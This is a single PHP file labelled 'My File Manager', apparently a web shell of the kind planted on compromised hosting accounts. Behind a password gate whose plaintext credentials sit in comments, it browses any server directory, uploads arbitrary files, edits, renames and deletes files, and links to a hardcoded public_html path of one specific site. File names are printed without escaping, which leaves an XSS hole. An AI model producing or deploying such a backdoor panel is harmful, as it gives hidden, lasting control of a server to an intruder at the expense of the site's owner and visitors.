<?php
session_start();

$valid_user_hash = '$2a$12$bK5fJmlxn1Ldqnb8G4uyNeFl5scFzY7rHDmz0n/gXQdHhP.mGa7RG'; // admin
$valid_pass_hash = '$2a$12$Or6xUx6qiHaUnEDKTq8CFO8yhAsl3AwQ9/.MyuPKux.pxJ1TTeg2e'; // gantengbanget

if (isset($_POST['user'], $_POST['pass'])) {
    if (
        password_verify($_POST['user'], $valid_user_hash) &&
        password_verify($_POST['pass'], $valid_pass_hash)
    ) {
        $_SESSION['login'] = true;
    } else {
        $error = "Login gagal, salah!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    exit('<script>location.href=location.pathname</script>');
}

if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <style>
            body { font-family: sans-serif; background: #f4f4f4; display: flex; height: 100vh; align-items: center; justify-content: center; }
            form { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            input { display: block; width: 100%; padding: 10px; margin-bottom: 10px; }
        </style>
    </head>
    <body>
        <form method="post">
            <h2>🔐 Login</h2>
            <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
            <input type="text" name="user" placeholder="Username" required>
            <input type="password" name="pass" placeholder="Password" required>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    <?php
    exit;
}

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();

function formatSize($s) {
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
    return $s . ' B';
}

if (isset($_GET['delete'])) {
    $target = realpath($path . '/' . $_GET['delete']);
    if (strpos($target, $path) === 0 && is_writable($target)) {
        if (is_file($target)) unlink($target);
        elseif (is_dir($target)) rmdir($target);
    }
    header("Location: ?path=" . urlencode($path)); exit;
}

if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = realpath($path . '/' . $_POST['rename_from']);
    $to = $path . '/' . basename($_POST['rename_to']);
    if (strpos($from, $path) === 0 && file_exists($from)) {
        rename($from, $to);
    }
    header("Location: ?path=" . urlencode($path)); exit;
}

if (isset($_POST['new_folder'])) {
    mkdir($path . '/' . basename($_POST['new_folder']));
    header("Location: ?path=" . urlencode($path)); exit;
}
if (isset($_POST['new_file'])) {
    file_put_contents($path . '/' . basename($_POST['new_file']), '');
    header("Location: ?path=" . urlencode($path)); exit;
}

if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . '/' . basename($_FILES['upload']['name']));
    header("Location: ?path=" . urlencode($path)); exit;
}

if (isset($_POST['save_file'], $_POST['content'])) {
    $file = realpath($path . '/' . $_POST['save_file']);
    if (strpos($file, $path) === 0 && is_file($file)) {
        file_put_contents($file, $_POST['content']);
    }
    header("Location: ?path=" . urlencode($path)); exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <style>
        body { font-family: sans-serif; background: #f9f9f9; padding: 20px; }
        table { width: 100%; background: #fff; border-collapse: collapse; }
        th, td { padding: 10px; border: 1px solid #ccc; }
        th { background: #eee; }
        input[type=text] { width: 200px; padding: 5px; }
        input[type=submit] { padding: 5px 10px; }
        textarea { width: 100%; height: 400px; font-family: monospace; }
        a.button { background: #008CBA; color: white; padding: 5px 10px; text-decoration: none; border-radius: 4px; }
    </style>
</head>
<body>
    <h2>My File Manager</h2>

    <p><strong>Path:</strong> <a href="?path=/home4/vallery1/domains/demo149.vallerysai.com/public_html">/home4/vallery1/domains/demo149.vallerysai.com/public_html</a></p>

    <p>
        <strong>Current Path:</strong> <?php echo htmlspecialchars($path); ?> |
        <a href="?logout=true">Logout</a>
        <?php
        $targetPath = '/home4/vallery1/domains/demo149.vallerysai.com/public_html';
        if ($path !== realpath($targetPath)) {
            echo ' | <a class="button" href="?path=' . urlencode($targetPath) . '">📁 Go to Vallery Path</a>';
        }
        ?>
    </p>

    <table>
        <tr><th>Name</th><th>Size</th><th>Perm</th><th>Actions</th></tr>
        <?php
        if ($path !== '/') {
            echo "<tr><td colspan='4'><a href='?path=" . urlencode(dirname($path)) . "'>.. (Up)</a></td></tr>";
        }
        foreach (scandir($path) as $f) {
            if ($f === '.') continue;
            $full = $path . '/' . $f;
            echo "<tr>";
            echo "<td>" . (is_dir($full) ? "<a href='?path=" . urlencode($full) . "'>[DIR] $f</a>" : "<a href='?path=" . urlencode($path) . "&edit=" . urlencode($f) . "'>$f</a>") . "</td>";
            echo "<td>" . (is_file($full) ? formatSize(filesize($full)) : '-') . "</td>";
            echo "<td>" . substr(sprintf('%o', fileperms($full)), -4) . "</td>";
            echo "<td>
                <form method='post' style='display:inline;'>
                    <input type='hidden' name='rename_from' value='" . htmlspecialchars($f) . "'>
                    <input type='text' name='rename_to' value='" . htmlspecialchars($f) . "'>
                    <input type='submit' value='Rename'>
                </form>
                <a href='?path=" . urlencode($path) . "&delete=" . urlencode($f) . "' onclick='return confirm(\"Yakin hapus?\")'>Delete</a>
                <a href='" . htmlspecialchars($full) . "' download>Download</a>
            </td>";
            echo "</tr>";
        }
        ?>
    </table>

    <h3>Upload File</h3>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload">
        <input type="submit" value="Upload">
    </form>

    <h3>Buat Folder</h3>
    <form method="post">
        <input type="text" name="new_folder" placeholder="Nama Folder">
        <input type="submit" value="Buat">
    </form>

    <h3>Buat File Kosong</h3>
    <form method="post">
        <input type="text" name="new_file" placeholder="Nama File.txt">
        <input type="submit" value="Buat">
    </form>

    <?php
    if (isset($_GET['edit'])):
        $edit = realpath($path . '/' . $_GET['edit']);
        if (strpos($edit, $path) === 0 && is_file($edit)):
            $isi = htmlspecialchars(file_get_contents($edit));
    ?>
    <h3>Edit File: <?php echo basename($edit); ?></h3>
    <form method="post">
        <textarea name="content"><?php echo $isi; ?></textarea><br>
        <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit)); ?>">
        <input type="submit" value="Save">
        <a href="?path=<?php echo urlencode($path); ?>" class="button">⬅️ Kembali</a>
    </form>
    <?php endif; endif; ?>
</body>
</html>
